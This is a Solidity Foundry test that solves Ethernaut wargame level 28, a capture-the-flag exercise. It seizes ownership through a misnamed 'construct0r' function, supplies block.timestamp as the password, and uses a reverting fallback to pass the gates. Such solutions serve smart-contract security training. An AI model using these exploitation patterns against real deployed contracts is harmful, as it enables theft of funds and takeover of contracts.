// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level28 {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
    function enter() external;
}

contract Level28Test is EthernautTest {
    Level28 level28Instance;

    function testLevel28() public {
        // We actually need tx.origin to be msg.sender for this level!
        vm.prank(tx.origin, tx.origin);
        _createLevel("28");

        level28Instance = Level28(levelInstance["28"]);

        // Call construct0r to set ourselves as owner
        level28Instance.construct0r();

        // We need to create the trick
        level28Instance.createTrick();

        // Since trick is created in the same block we can allow
        // the entrance by setting block.timestamp
        level28Instance.getAllowance(block.timestamp);

        // Send 1 wei more than 0.001 ether to pass the third gate
        // We need to revert the fallback and receive function to
        // pass the other condition
        (bool success,) = address(level28Instance).call{value: 0.001 ether + 1 wei}("");

        // We can then safely enter
        level28Instance.enter();

        // We actually set our player to tx.origin for this level!
        vm.prank(tx.origin, tx.origin);
        require(_submitLevel("28"));
    }

    fallback() external payable {
        revert();
    }
}
